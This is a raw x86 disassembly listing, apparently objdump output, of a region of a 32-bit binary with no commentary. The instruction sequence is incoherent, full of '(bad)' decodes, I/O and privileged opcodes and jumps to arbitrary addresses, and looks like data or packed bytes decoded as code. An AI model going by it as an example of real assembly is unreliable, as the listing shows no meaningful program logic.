  40a1e1:	mov    ebp,0x740e77f0
  40a1e6:	push   edi
  40a1e7:	mov    edi,0x4a0254d3
  40a1ec:	mov    bl,BYTE PTR [ecx]
  40a1ee:	mov    dl,0x49
  40a1f0:	inc    edi
  40a1f1:	ffreep st(4)
  40a1f3:	dec    edi
  40a1f4:	lea    eax,[ebx+0x76554a62]
  40a1fa:	popa   
  40a1fb:	add    DWORD PTR [edx-0x32],ebx
  40a1fe:	aam    0x8e
  40a200:	mov    esp,0xbd5f5cba
  40a205:	pop    es
  40a206:	andnps xmm7,XMMWORD PTR [esi]
  40a209:	xor    bh,BYTE PTR [esi]
  40a20b:	sub    bl,cl
  40a20d:	jecxz  0x40a24a
  40a20f:	sbb    ecx,DWORD PTR [edi+esi*1-0x32f99ade]
  40a216:	fidiv  DWORD PTR [eax-0x6a]
  40a219:	hlt    
  40a21a:	daa    
  40a21b:	pop    eax
  40a21c:	ror    BYTE PTR [ebx-0x47],cl
  40a21f:	cld    
  40a220:	xchg   edi,eax
  40a221:	imul   ebp,DWORD PTR [edi],0x61f7e23a
  40a227:	imul   eax,DWORD PTR [edi+0x6ae839b5],0x45
  40a22e:	outs   dx,BYTE PTR ds:[esi]
  40a22f:	or     eax,0xa74c188c
  40a234:	into   
  40a235:	adc    cl,bh
  40a237:	xchg   esi,eax
  40a238:	lea    edi,[ecx+ebp*4-0x37871b52]
  40a23f:	sahf   
  40a240:	les    edx,FWORD PTR [edi+0x291c1e38]
  40a246:	dec    ebx
  40a247:	sub    bl,BYTE PTR [edx-0xd4789d5]
  40a24d:	push   cs
  40a24e:	pop    esp
  40a24f:	and    ebp,DWORD PTR [ebx+0x50]
  40a252:	rcl    ah,0x74
  40a255:	prefetch BYTE PTR [edi-0x2a925958]
  40a25c:	std    
  40a25d:	sub    BYTE PTR [ebx-0x3eb85bd9],dh
  40a263:	mov    ebx,0x8f31d0eb
  40a268:	inc    ebx
  40a269:	ja     0x40a21b
  40a26b:	scas   al,BYTE PTR es:[edi]
  40a26c:	ficomp DWORD PTR [ebp+0x6]
  40a26f:	xor    eax,0x5d8d39ad
  40a274:	aas    
  40a275:	sbb    DWORD PTR [ecx+0x1c],ecx
  40a278:	lahf   
  40a279:	int3   
  40a27a:	and    ecx,DWORD PTR [edi+0x7b]
  40a27d:	pop    esp
  40a27e:	add    al,BYTE PTR [eax]
  40a280:	int3   
  40a281:	int    0x7e
  40a283:	jge    0x40a227
  40a285:	xor    ecx,DWORD PTR [edi+0x6ea02dc4]
  40a28b:	jmp    0x98ace6a
  40a290:	mov    al,0xfb
  40a292:	pop    esi
  40a293:	es icebp 
  40a295:	sahf   
  40a296:	xor    esi,esi
  40a298:	imul   ebp,edi,0x24
  40a29b:	call   0x24f3a9ee
  40a2a0:	xor    BYTE PTR [ebx],cl
  40a2a2:	retf   
  40a2a3:	pop    es
  40a2a4:	stc    
  40a2a5:	jb     0x40a286
  40a2a7:	sub    cl,cl
  40a2a9:	out    dx,eax
  40a2aa:	jbe    0x40a292
  40a2ac:	(bad)  
  40a2ad:	rol    esp,cl
  40a2af:	inc    ebx
  40a2b0:	adc    BYTE PTR [ebx+0x27],dl
  40a2b3:	repz (bad) [edx+0x22]
  40a2b7:	xchg   DWORD PTR [ebx+0x129e141d],esp
  40a2bd:	jns    0x40a311
  40a2bf:	jne    0x40a241
  40a2c1:	push   ebp
  40a2c2:	add    edx,DWORD PTR [eax+eax*4-0x4]
  40a2c6:	mov    ch,0x21
  40a2c8:	jne    0x40a307
  40a2ca:	lahf   
  40a2cb:	nop
  40a2cc:	sub    al,0x70
  40a2ce:	ins    BYTE PTR es:[edi],dx
  40a2cf:	sub    dh,BYTE PTR [ebx+0x64]
  40a2d2:	stos   BYTE PTR es:[edi],al
  40a2d3:	jne    0x40a30c
  40a2d5:	bound  edi,QWORD PTR [eax+0x29]
  40a2d8:	ins    DWORD PTR es:[edi],dx
  40a2d9:	push   ebx
  40a2da:	aad    0x81
  40a2dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a2dd:	aad    0x26
  40a2df:	mov    eax,ds:0x43e9ff68
  40a2e4:	dec    ecx
  40a2e5:	(bad)  
  40a2e6:	push   ecx
  40a2e7:	ja     0x40a336
  40a2e9:	dec    ecx
  40a2ea:	xchg   BYTE PTR [edi+0x58],dh
  40a2ed:	mov    bl,0x16
  40a2ef:	fs jns 0x40a2e2
  40a2f2:	popa   
  40a2f3:	inc    DWORD PTR [edi+0x60043040]
  40a2f9:	mov    cl,0x1
  40a2fb:	shl    BYTE PTR [edx],cl
  40a2fd:	clc    
  40a2fe:	call   0x5210:0x97ecddee
  40a305:	sbb    al,0xd9
  40a307:	sbb    esp,eax
  40a309:	psubb  mm4,QWORD PTR [ecx+0x15fe47cd]
  40a310:	fstp   TBYTE PTR [eax]
  40a312:	push   ecx
  40a313:	lea    esi,[esi+0x26]
  40a316:	add    BYTE PTR fs:[edi],bh
  40a319:	and    ebp,DWORD PTR [ebp+0x3c]
  40a31c:	les    ebx,FWORD PTR [ebp-0x1f]
  40a31f:	cmc    
  40a320:	pop    edx
  40a321:	xchg   esp,eax
  40a322:	sub    DWORD PTR [eax+0xf],esp
  40a325:	adc    edi,DWORD PTR [edx+0x564f2792]
  40a32b:	lahf   
  40a32c:	(bad)  
  40a32d:	es sub ebx,edx
  40a330:	push   0x1b
  40a332:	ds mov ebx,0xb2c490f9
  40a338:	mov    cl,0x31
  40a33a:	or     dl,BYTE PTR [ebp+0xa]
  40a33d:	adc    bl,ch
  40a33f:	jmp    0xd14c4ed7
  40a344:	cmp    DWORD PTR ds:0xe0edd57f,esi
  40a34a:	inc    esp
  40a34b:	sbb    eax,0x3548388c
  40a350:	add    edi,DWORD PTR [ecx-0x2e]
  40a353:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a354:	lahf   
  40a355:	push   es
  40a356:	push   edi
  40a357:	xor    DWORD PTR ds:0x2b46a78e,ebp
  40a35d:	cmp    eax,0xbc062adb
  40a362:	inc    eax
  40a363:	xor    al,0xc0
  40a365:	pop    ebp
  40a366:	shr    DWORD PTR [edi+0x26],0xe6
  40a36a:	and    WORD PTR [edi],bx
  40a36d:	mov    cl,0x3e
  40a36f:	mov    eax,0xe14022bb
  40a374:	enter  0x6838,0x59
  40a378:	mov    gs,ebx
  40a37a:	sahf   
  40a37b:	lahf   
  40a37c:	sahf   
  40a37d:	jp     0x40a3b4
  40a37f:	mov    al,0xed
  40a381:	adc    eax,esp
  40a383:	pop    eax
  40a384:	cs int3 
  40a386:	mov    ebx,0xb161ef66
  40a38b:	jl     0x40a353
  40a38d:	repnz or BYTE PTR [esi],cl
  40a390:	mov    ds:0x346bd5ff,eax
  40a395:	and    esp,eax
  40a397:	rol    BYTE PTR [edi-0x62f2cb4c],1
  40a39d:	clc    
  40a39e:	dec    esp
  40a39f:	div    DWORD PTR [edi+eiz*1+0x6fc82800]
  40a3a6:	pop    ss
  40a3a7:	dec    eax
  40a3a8:	mov    ah,0x67
  40a3aa:	out    dx,eax
  40a3ab:	or     al,0xf8
  40a3ad:	jo     0x40a3f9
  40a3af:	repnz xchg ebp,eax
  40a3b1:	pop    esi
  40a3b2:	xchg   esp,eax
  40a3b3:	out    dx,eax
  40a3b4:	ss jg  0x40a42d
  40a3b7:	sub    dh,BYTE PTR [edx+eiz*8+0x2b]
  40a3bb:	fdivr  QWORD PTR [eax-0x3dde0514]
  40a3c1:	cmc    
  40a3c2:	ret    
  40a3c3:	int3   
  40a3c4:	xchg   ebx,eax
  40a3c5:	test   eax,0x4420cc51
  40a3ca:	call   0x6f63:0x62f8c918
  40a3d1:	ret    0xffea
  40a3d4:	xor    al,0xc
  40a3d6:	xor    ah,ch
  40a3d8:	adc    eax,0xcafb0dc
  40a3dd:	adc    al,0xc1
  40a3df:	jns    0x40a392
  40a3e1:	push   cs
  40a3e2:	pop    ss
  40a3e3:	dec    ebp
  40a3e4:	pop    ebp
  40a3e5:	adc    BYTE PTR [esi],al
  40a3e7:	in     al,0x57
  40a3e9:	xchg   BYTE PTR [ebx+ebp*8],ah
  40a3ec:	pop    eax
  40a3ed:	in     eax,0xbb
  40a3ef:	sbb    BYTE PTR es:[eax-0x1d1a5727],ah
  40a3f6:	popa   
  40a3f7:	xchg   ecx,eax
  40a3f8:	mov    dh,0xf9
  40a3fa:	shl    BYTE PTR [ebx],1
  40a3fc:	mov    dl,0x76
  40a3fe:	mov    al,0xf3
  40a400:	je     0x40a3e0
  40a402:	cmc    
  40a403:	pop    edx
  40a404:	imul   dh
  40a406:	mov    edx,0xbf19d6a6
  40a40b:	or     ebp,DWORD PTR [edx]
  40a40d:	xor    BYTE PTR [ecx],0x75
  40a410:	ja     0x40a3b1
  40a412:	adc    DWORD PTR [eax-0x54],ebx
  40a415:	mov    ebx,0x87d7a41
  40a41a:	loope  0x40a469
  40a41c:	sahf   
  40a41d:	int3   
  40a41e:	ds cli 
  40a420:	dec    ebx
  40a421:	pop    esp
  40a423:	fs mov dh,0xa7
  40a426:	inc    esp
  40a428:	push   ecx
  40a429:	add    DWORD PTR [ebx+0x1e9a5b35],esi
  40a42f:	ror    BYTE PTR [edi],cl
  40a431:	ret    0x144b
  40a434:	lods   al,BYTE PTR ds:[esi]
  40a435:	cmp    esp,DWORD PTR [eax+0x1feddebd]
  40a43b:	ins    DWORD PTR es:[edi],dx
  40a43c:	imul   edi,DWORD PTR [edx],0x2b
  40a43f:	push   esi
  40a440:	mov    esi,0x5333ddc0
  40a445:	in     eax,dx
  40a446:	mov    WORD PTR [ebp-0x55005426],?
  40a44c:	mov    BYTE PTR [ebp+ebp*2+0x8],ah
  40a450:	adc    BYTE PTR [edx-0x6],ch
  40a453:	push   ss
  40a454:	fbld   TBYTE PTR [ebx-0xb6893c2]
  40a45a:	hlt    
  40a45b:	or     al,0xd9
  40a45d:	out    dx,eax
  40a45e:	loopne 0x40a4a2
  40a460:	sar    BYTE PTR [ecx+edi*4-0x64],1
  40a464:	mov    bl,0x22
  40a466:	sbb    DWORD PTR [edi],esp
  40a468:	pop    edi
  40a469:	jbe    0x40a4d7
  40a46b:	add    al,0x22
  40a46d:	mov    edx,0x82e6e42e
  40a472:	mov    ebx,0x2a7972c5
  40a477:	addr16 pop eax
  40a479:	sahf   
  40a47a:	sub    esi,0x28
  40a47d:	push   0xa804bb37
  40a482:	ror    BYTE PTR [esi],0x90
  40a485:	xchg   esi,ecx
  40a487:	jecxz  0x40a4d4
  40a489:	mov    edx,0x5de0f8bb
  40a48e:	scas   eax,DWORD PTR es:[edi]
  40a48f:	stc    
  40a490:	mov    bl,0x6d
  40a492:	fs scas al,BYTE PTR es:[edi]
  40a494:	xlat   BYTE PTR ds:[ebx]
  40a495:	mov    ah,0xc0
  40a497:	sbb    ch,BYTE PTR [edx+0x7708896f]
  40a49d:	xor    eax,0x32e44945
  40a4a2:	out    dx,eax
  40a4a3:	(bad)  [edx]
  40a4a5:	xchg   edi,eax
  40a4a6:	inc    esp
  40a4a7:	inc    esp
  40a4a8:	add    bl,BYTE PTR [ebx-0x65]
  40a4ab:	jmp    0x40a43a
  40a4ad:	dec    ebx
  40a4ae:	or     eax,0x5a6ac233
  40a4b3:	mov    edx,0xb034afd3
  40a4b8:	inc    eax
  40a4b9:	cdq    
  40a4ba:	lahf   
  40a4bb:	jmp    0x40a4e6
  40a4bd:	loopne 0x40a472
  40a4bf:	jmp    0x40a4f0
  40a4c1:	dec    ecx
  40a4c2:	pop    ds
  40a4c3:	out    0xdc,eax
  40a4c5:	fnstcw WORD PTR [eax]
  40a4c7:	in     al,0x83
  40a4c9:	dec    ecx
  40a4ca:	pusha  
  40a4cb:	int    0x9d
  40a4cd:	or     eax,0xedf4c710
  40a4d2:	dec    ecx
  40a4d3:	or     eax,0x6584960d
  40a4d8:	pop    ebp
  40a4d9:	mov    bh,0x2b
  40a4db:	sar    cl,1
  40a4dd:	loopne 0x40a4d0
  40a4df:	int    0xa7
  40a4e1:	sti    
  40a4e2:	push   ecx
  40a4e3:	mov    al,ds:0xa28b8896
  40a4e8:	pop    edx
  40a4e9:	ds nop
  40a4eb:	xchg   DWORD PTR [edx+edx*2-0x1d],ecx
  40a4ef:	mov    BYTE PTR [edx+0x1f106923],0xdb
  40a4f6:	jo     0x40a4c8
  40a4f8:	loopne 0x40a47b
  40a4fa:	jbe    0x40a544
  40a4fc:	and    BYTE PTR [ebx-0x3d],cl
  40a4ff:	ret    0xcf00
  40a502:	ss mov ebx,esi
  40a505:	or     ecx,DWORD PTR [edx-0x1b]
  40a508:	add    eax,0xe0fa942c
  40a50d:	xor    DWORD PTR [eax+0x79986513],0xdc5b491d
  40a517:	test   eax,0xe60b42e0
  40a51c:	cmp    al,0x16
  40a51e:	jne    0x40a58f
  40a520:	mov    ds:0xecd250e,eax
  40a525:	hlt    
  40a526:	adc    bl,BYTE PTR ds:0xb2d8b39a
  40a52c:	and    BYTE PTR [ebp+0x7],dl
  40a52f:	xchg   ebx,eax
  40a530:	scas   al,BYTE PTR es:[edi]
  40a531:	(bad)  
  40a532:	mov    cl,0xe8
  40a534:	ror    DWORD PTR [ecx],cl
  40a536:	out    0xb9,al
  40a538:	inc    esi
  40a539:	in     eax,0x5
  40a53b:	xchg   ebp,eax
  40a53c:	inc    ecx
  40a53d:	xor    BYTE PTR [ebp+ebp*2-0x33],dl
  40a541:	and    eax,esi
  40a543:	or     DWORD PTR [esi-0x5be4f390],ebx
  40a549:	push   0x44883c91
  40a54e:	mov    eax,0x7d0065b8
  40a553:	mov    dl,0x67
  40a555:	inc    esi
  40a556:	mov    dl,0xd4
  40a558:	xor    BYTE PTR [ebx+0x3f],0xc3
  40a55c:	adc    al,0x34
  40a55e:	mov    ah,0x33
  40a560:	sub    edx,0xbe55534a
  40a566:	in     eax,dx
  40a567:	loop   0x40a4fa
  40a569:	cli    
  40a56a:	shl    DWORD PTR [ebp-0x1d],1
  40a56d:	adc    ah,BYTE PTR [ebx-0x58d6acd9]
  40a573:	xor    eax,0xe6988d5e
  40a578:	clc    
  40a579:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a57a:	push   edi
  40a57b:	cwde   
  40a57c:	push   ss
  40a57d:	xchg   esp,eax
  40a57e:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  40a580:	jp     0x40a52b
  40a582:	pusha  
  40a583:	jecxz  0x40a5c2
  40a585:	int    0x9a
  40a587:	push   0xffffffc2
  40a589:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a58a:	neg    DWORD PTR [ecx+0x42b7addf]
  40a590:	dec    ebp
  40a591:	dec    esp
  40a592:	retf   0xdb73
  40a595:	loopne 0x40a59c
  40a597:	push   0xde268955
  40a59c:	inc    ebp
  40a59d:	and    al,0x8b
  40a59f:	cld    
  40a5a0:	dec    esp
  40a5a1:	mov    dl,0x68
  40a5a3:	mov    bl,0x85
  40a5a5:	lods   eax,DWORD PTR ds:[esi]
  40a5a6:	shl    BYTE PTR [ebp+0x34],1
  40a5a9:	lahf   
  40a5aa:	pop    esi
  40a5ab:	adc    al,0xe9
  40a5ad:	ds pop es
  40a5af:	dec    ebx
  40a5b0:	gs jb  0x40a5b2
  40a5b3:	dec    ecx
  40a5b4:	call   0xbaf201b9
  40a5b9:	mov    DWORD PTR [edi-0x79],eax
  40a5bc:	sti    
  40a5bd:	pop    ebx
  40a5be:	imul   ecx,DWORD PTR [eax],0xd1e0ad34
  40a5c4:	add    al,BYTE PTR [esi+ebp*1-0x70]
  40a5c8:	pop    edi
  40a5c9:	and    DWORD PTR [ecx+0xdd783d7],edx
  40a5cf:	dec    eax
  40a5d0:	arpl   bx,si
  40a5d2:	ja     0x40a639
  40a5d4:	or     BYTE PTR [edi+0xe],ah
  40a5d7:	stc    
  40a5d8:	cli    
  40a5d9:	dec    esi
  40a5da:	(bad)  
  40a5db:	jmp    0x281c0d6f
  40a5e0:	dec    ebx
  40a5e1:	gs inc esi
  40a5e3:	and    al,0xed
  40a5e5:	enter  0xf365,0x96
  40a5e9:	into   
  40a5ea:	sub    DWORD PTR [ebx+0x67],ecx
  40a5ed:	and    DWORD PTR ds:0x7c71ccbb,eax
  40a5f3:	mov    al,ds:0xcced4c3d
  40a5f8:	test   al,0x7e
  40a5fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a5fb:	push   ebx
  40a5fc:	sub    esi,ebp
  40a5fe:	dec    esp
  40a5ff:	aam    0x70
  40a601:	xchg   dl,ah
  40a603:	mov    eax,0xbd1da94f
  40a608:	lea    edx,[esi+edx*2-0x59f8c58c]
  40a60f:	out    0x2e,al
  40a611:	test   DWORD PTR [edx-0x53],0x28300c19
  40a618:	mov    BYTE PTR [edx],bl
  40a61a:	or     edi,DWORD PTR [edx+0x73]
  40a61d:	shl    BYTE PTR [edx+ebx*8-0x395cea48],cl
  40a624:	(bad)  
  40a626:	jle    0x40a66f
  40a628:	push   ebx
  40a629:	sbb    esi,DWORD PTR [esi+ebx*8+0x5fc8edbb]
  40a630:	sbb    cl,BYTE PTR [edx+0x34]
  40a633:	add    BYTE PTR [eax],cl
  40a635:	jne    0x40a68f
  40a637:	jmp    0xac11:0x571dbddd
  40a63e:	scas   al,BYTE PTR es:[edi]
  40a63f:	outs   dx,BYTE PTR ds:[esi]
  40a640:	(bad)  
  40a641:	mov    bl,0x9b
  40a643:	imul   edi,DWORD PTR [ecx+0x7a],0x6d
  40a647:	push   ss
  40a648:	call   0x62eead0c
  40a64d:	scas   al,BYTE PTR es:[edi]
  40a64e:	jo     0x40a5f7
  40a650:	mov    esp,0xa1650914
  40a655:	pop    es
  40a656:	xor    al,0xa3
  40a658:	sub    al,ah
  40a65a:	inc    eax
  40a65b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a65c:	(bad)  
  40a65d:	jo     0x40a61d
  40a65f:	sbb    al,cl
  40a661:	ss and al,0x72
  40a664:	lds    ebx,FWORD PTR [edi+edi*1+0x3]
  40a668:	sub    bl,al
  40a66a:	pushf  
  40a66b:	inc    esp
  40a66c:	dec    edx
  40a66d:	in     eax,0x25
  40a66f:	push   esp
  40a670:	mov    eax,ds:0xa2d2429e
  40a675:	stos   BYTE PTR es:[edi],al
  40a676:	add    BYTE PTR [eax+0x18],cl
  40a679:	loope  0x40a687
  40a67b:	call   0xf135:0x8849d9aa
  40a682:	inc    di
  40a684:	retf   
  40a685:	pop    edx
  40a686:	popf   
  40a687:	sbb    edx,ecx
  40a689:	jp     0x40a652
  40a68b:	xlat   BYTE PTR ds:[ebx]
  40a68c:	sahf   
  40a68d:	ret    
  40a68e:	std    
  40a68f:	mov    ds:0xfc88ed8a,al
  40a694:	xchg   esi,eax
  40a695:	sti    
  40a696:	(bad)  
  40a698:	xor    al,0xd1
  40a69a:	sbb    al,0xeb
  40a69c:	xor    bl,BYTE PTR [ebx+ebx*1+0x11]
  40a6a0:	pusha  
  40a6a1:	in     eax,dx
  40a6a2:	dec    esi
  40a6a3:	jge    0x40a69a
  40a6a5:	div    DWORD PTR [esi-0x36d5c6b4]
  40a6ab:	mov    eax,ds:0x325ec0d4
  40a6b0:	push   edi
  40a6b1:	dec    ecx
  40a6b2:	ror    BYTE PTR [eax],0xca
  40a6b5:	cmp    eax,0xcf0c8ddd
  40a6ba:	add    eax,0x4e6ebde8
  40a6bf:	push   edi
  40a6c0:	pop    ss
  40a6c1:	mov    dl,BYTE PTR [edx-0x65b8e630]
  40a6c7:	jmp    0x9323:0x985a2183
  40a6ce:	cmc    
  40a6cf:	xchg   ebx,eax
  40a6d0:	add    eax,0xa3833601
  40a6d5:	mov    al,ds:0x4df59369
  40a6da:	out    0x6d,al
  40a6dc:	cs retf 
  40a6de:	pop    ebx
  40a6df:	in     al,0xdc
  40a6e1:	out    0xd6,al
  40a6e3:	xor    DWORD PTR [edi],0x69
  40a6e6:	sbb    ebx,edx
  40a6e8:	daa    
  40a6e9:	retf   
  40a6ea:	dec    ebx
  40a6eb:	and    DWORD PTR [eax+ebp*2-0x5f0baaad],eax
  40a6f2:	mov    ecx,0xef7166d7
  40a6f7:	or     DWORD PTR [ebx-0x40],ecx
  40a6fa:	xchg   ebx,eax
  40a6fb:	jg     0x40a68e
  40a6fd:	out    dx,eax
  40a6fe:	loopne 0x40a748
  40a700:	sti    
  40a701:	adc    DWORD PTR [ebp+ebx*8-0x43],0x9
  40a706:	int3   
  40a707:	xchg   edi,eax
  40a708:	(bad)  
  40a709:	jp     0x40a71d
  40a70b:	dec    ecx
  40a70c:	lock fadd QWORD PTR [eax-0x5c]
  40a710:	mov    esi,0xd1441ee4
  40a715:	das    
  40a716:	in     eax,0xe3
  40a718:	xor    al,ah
  40a71a:	cmc    
  40a71b:	push   edi
  40a71c:	scas   al,BYTE PTR es:[edi]
  40a71d:	scas   eax,DWORD PTR es:[edi]
  40a71e:	out    dx,al
  40a71f:	loopne 0x40a6c4
  40a721:	add    eax,0x19f38550
  40a726:	jb     0x40a72b
  40a728:	scas   eax,DWORD PTR es:[edi]
  40a729:	in     al,0x36
  40a72b:	jnp    0x40a72a
  40a72d:	in     eax,dx
  40a72e:	jmp    0x40a6ff
  40a730:	cmp    al,0x7
  40a732:	mov    ah,0xb5
  40a734:	cmc    
  40a735:	outs   dx,BYTE PTR ds:[esi]
  40a736:	gs pop ebx
  40a738:	shr    edx,1
  40a73a:	jae    0x40a75d
  40a73c:	mov    ecx,DWORD PTR [eax+0x1d21bb91]
  40a742:	add    dh,BYTE PTR [ebp+0x35]
  40a745:	aaa    
  40a746:	or     BYTE PTR [eax-0x11],dh
  40a749:	inc    eax
  40a74a:	sahf   
  40a74b:	scas   al,BYTE PTR es:[edi]
  40a74c:	rol    BYTE PTR [ebx-0x55],cl
  40a74f:	mov    ds:0x89734c15,al
  40a754:	push   ds
  40a755:	mov    bh,0xa
  40a757:	xchg   edx,eax
  40a758:	cli    
  40a759:	pop    ds
  40a75a:	je     0x40a74b
  40a75c:	pop    es
  40a75d:	sbb    bh,ah
  40a75f:	pop    ss
  40a760:	lea    esi,[edi-0x5ca6c0de]
  40a766:	vmwrite esi,ecx
  40a769:	adc    BYTE PTR [esi],ch
  40a76b:	ror    bh,0xd0
  40a76e:	mov    eax,0x2f5c6c70
  40a773:	in     al,dx
  40a774:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a775:	cwde   
  40a776:	ins    BYTE PTR es:[edi],dx
  40a777:	sub    al,0x47
  40a779:	out    dx,eax
  40a77a:	ja     0x40a72b
  40a77c:	lahf   
  40a77d:	sub    DWORD PTR [ecx+0x77],0xffffffcb
  40a781:	pop    es
  40a782:	ret    
  40a783:	xchg   ecx,eax
  40a784:	mov    esp,?
  40a786:	out    0x96,eax
  40a788:	imul   eax,esp,0xffffffbc
  40a78b:	retf   
  40a78c:	or     al,0xfd
  40a78e:	push   es
  40a78f:	pusha  
  40a790:	shr    bl,cl
  40a792:	or     eax,esi
  40a794:	and    al,0x3b
  40a796:	mov    ebx,DWORD PTR [edi]
  40a798:	fs xor eax,0x18065705
  40a79e:	inc    ebx
  40a79f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a7a0:	dec    edi
  40a7a1:	xchg   ebx,eax
  40a7a2:	adc    bl,BYTE PTR [eax+edx*4+0xabe585a]
  40a7a9:	daa    
  40a7aa:	mov    ds:0x3cd96eff,eax
  40a7af:	pop    ds
  40a7b0:	inc    ebx
  40a7b1:	and    ecx,DWORD PTR [esi]
  40a7b3:	loop   0x40a80b
  40a7b5:	scas   eax,DWORD PTR es:[edi]
  40a7b6:	stos   DWORD PTR es:[edi],eax
  40a7b7:	push   es
  40a7b8:	(bad)  
  40a7b9:	sub    edx,DWORD PTR [ebp-0x42]
  40a7bc:	mov    dh,0xfc
  40a7be:	hlt    
  40a7bf:	mov    ebp,0x1e13bcc
  40a7c4:	int    0xa8
  40a7c6:	xchg   ebx,eax
  40a7c7:	mov    bh,0xcd
  40a7c9:	out    0xa1,al
  40a7cb:	xor    cl,BYTE PTR [eax+ecx*4+0x147e38cd]
  40a7d2:	dec    edi
  40a7d3:	sub    eax,0x28e462e4
  40a7d8:	sbb    DWORD PTR [ecx+0x6c6507a7],esp
  40a7de:	shl    ch,1
  40a7e0:	xchg   edx,eax
  40a7e1:	inc    eax
  40a7e2:	push   0xf9bed8b3
  40a7e7:	add    DWORD PTR [ecx-0x286fc841],ecx
  40a7ed:	loope  0x40a851
  40a7ef:	adc    BYTE PTR [edi-0x1360ff51],0x79
  40a7f6:	loop   0x40a7a5
  40a7f8:	jle    0x40a82c
  40a7fa:	fwait
  40a7fb:	test   BYTE PTR [edx+0x3f],bh
  40a7fe:	cli    
  40a7ff:	push   cs
  40a800:	mov    cl,0xde
  40a802:	ss add bh,bh
  40a805:	add    ebp,esp
  40a807:	xor    al,0xc7
  40a809:	int3   
  40a80a:	and    al,0x68
  40a80c:	mov    dh,0x63
  40a80e:	jb     0x40a83d
  40a810:	and    al,0xaf
  40a812:	add    ch,cl
  40a814:	aam    0xb8
  40a816:	(bad)  
  40a817:	inc    edi
  40a818:	addr16 pusha 
  40a81a:	mov    ch,0x3f
  40a81c:	cli    
  40a81d:	lahf   
  40a81e:	mov    edi,DWORD PTR [edi]
  40a820:	sti    
  40a821:	mov    eax,ds:0x8cfc6a17
  40a826:	rcr    BYTE PTR [edx],1
  40a828:	xor    eax,0x4f3306d0
  40a82d:	ja     0x40a86c
  40a82f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a830:	data16 fadd DWORD PTR [edx-0x2562f24]
  40a837:	adc    al,0xeb
  40a839:	fsubr  DWORD PTR [edx+0x799d27f]
  40a83f:	or     cl,BYTE PTR [ecx+0x53]
  40a842:	rol    eax,0x9
  40a845:	sub    eax,0xd072c79d
  40a84a:	mul    DWORD PTR [ecx+0x3bdfd5b1]
  40a850:	cs cli 
  40a852:	xchg   esi,eax
  40a853:	fs je  0x40a8b2
  40a856:	jne    0x40a85a
  40a858:	ja     0x40a86b
  40a85a:	call   FWORD PTR ds:0x9636e75c
  40a860:	cmp    DWORD PTR [edx-0x74f37ab5],ebp
  40a866:	mov    edi,0xeb030806
  40a86b:	rcl    DWORD PTR [ecx-0x61],cl
  40a86e:	ficomp WORD PTR [ecx]
  40a870:	pop    ebp
  40a871:	stos   BYTE PTR es:[edi],al
  40a872:	sub    cl,BYTE PTR [edi+0x5ff0d0f]
  40a878:	adc    al,0x1e
  40a87a:	dec    ecx
  40a87b:	out    0xa,eax
  40a87d:	dec    ebp
  40a87e:	ins    BYTE PTR es:[edi],dx
  40a87f:	push   0x21
  40a881:	mov    bh,0xcf
  40a883:	jg     0x40a849
  40a885:	aas    
  40a886:	push   edi
  40a887:	sar    ah,cl
  40a889:	mov    ah,0xec
  40a88b:	ret    
  40a88c:	out    dx,eax
  40a88d:	jp     0x40a895
  40a88f:	enter  0x85a8,0x82
  40a893:	imul   BYTE PTR [ebp-0x108bb88e]
  40a899:	jmp    0x40a87b
  40a89b:	ror    eax,cl
  40a89d:	xchg   edx,eax
  40a89e:	lock in al,0x4c
  40a8a1:	jnp    0x40a823
  40a8a3:	shl    DWORD PTR [edx-0x9e69d80],cl
  40a8a9:	dec    ebx
  40a8aa:	cmovo  ebx,DWORD PTR [ebx+esi*2-0x71]
  40a8af:	sub    al,0x8f
  40a8b1:	fst    QWORD PTR [ebx+0x10879ae6]
  40a8b7:	inc    esp
  40a8b8:	dec    esi
  40a8b9:	jge    0x40a909
  40a8bb:	scas   eax,DWORD PTR es:[edi]
  40a8bc:	add    ah,al
  40a8be:	cmp    al,0xb6
  40a8c0:	mov    dl,0x25
  40a8c2:	out    dx,eax
  40a8c3:	xor    BYTE PTR [edx+0x29fffbd3],cl
  40a8c9:	add    ebp,ecx
  40a8cb:	loop   0x40a850
  40a8cd:	sar    BYTE PTR [edx-0x17],1
  40a8d0:	enter  0x8c46,0xe3
  40a8d4:	call   0x517a:0x34029535
  40a8db:	mov    ebp,0x3c089d07
  40a8e0:	jo     0x40a935
  40a8e2:	call   0x97d969e8
  40a8e7:	fist   DWORD PTR [esi]
  40a8e9:	mov    ah,BYTE PTR [edi+0x4b]
  40a8ec:	dec    edx
  40a8ed:	xor    al,BYTE PTR [edx+0x45]
  40a8f0:	xchg   edx,eax
  40a8f1:	mov    eax,ds:0x1c5c2f06
  40a8f6:	hlt    
  40a8f7:	xchg   DWORD PTR [eax-0x1431fdd5],edx
  40a8fd:	lods   al,BYTE PTR ds:[esi]
  40a8fe:	adc    BYTE PTR [ecx-0x176dff8b],ah
  40a904:	mov    DWORD PTR [ebx-0x6acb47d9],eax
  40a90a:	xor    ah,BYTE PTR [ebx-0x7d]
  40a90d:	lock shl DWORD PTR [ebp+0x59489340],1
  40a914:	and    DWORD PTR [edx+0x2c413aa4],eax
  40a91a:	xor    eax,0x3cc264d6
  40a91f:	sub    BYTE PTR [edx+0x16],ch
  40a922:	xor    ecx,0x854d1b2b
  40a928:	(bad)  
  40a929:	pop    esp
  40a92a:	xchg   edi,eax
  40a92b:	out    0x69,eax
  40a92d:	jg     0x40a958
  40a92f:	fidiv  DWORD PTR [edx+0x3092f071]
  40a935:	ret    
  40a936:	out    0x67,eax
  40a938:	sbb    BYTE PTR [ebp+ebp*2+0x56ab5c96],cl
  40a93f:	popa   
  40a940:	adc    al,BYTE PTR [ecx-0x68]
  40a943:	xchg   edi,eax
  40a944:	inc    eax
  40a945:	xlat   BYTE PTR ds:[ebx]
  40a946:	mov    eax,0x3941949f
  40a94b:	mov    WORD PTR [ebx],?
  40a94d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a94e:	repz in eax,dx
  40a950:	in     al,0xd6
